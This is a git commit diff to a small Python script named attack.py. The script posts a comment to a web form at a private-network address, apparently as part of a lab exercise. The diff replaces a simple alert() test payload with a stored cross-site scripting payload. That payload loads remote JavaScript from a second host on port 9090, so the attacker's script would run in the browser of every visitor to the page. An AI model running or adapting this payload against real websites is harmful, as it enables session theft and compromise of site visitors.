cb7fe1905a064592ee2312bc278f4b83aee560f4
Nyanyi <yprentis@gmail.com>
2020-05-15 17:30:00 +0200

    minium changes

--- attack.py
+++ attack.py
@@ -2,7 +2,6 @@ import requests
 
 
 uri= "http://172.16.113.150/post_comment.php?id=2"
-#r=request.get("http://172.16.113.150")
-payload ={'title':'Confuse', 'author':'nyanyi','text':'<script>alert(2)</script>','submit':'submit'}
+payload ={'title':'Confuse', 'author':'nyanyi','text':'<script src="http://172.16.113.48:9090/xss.js"></script>','submit':'submit'}
 r=requests.post(uri, data=payload)
 print(r.url)
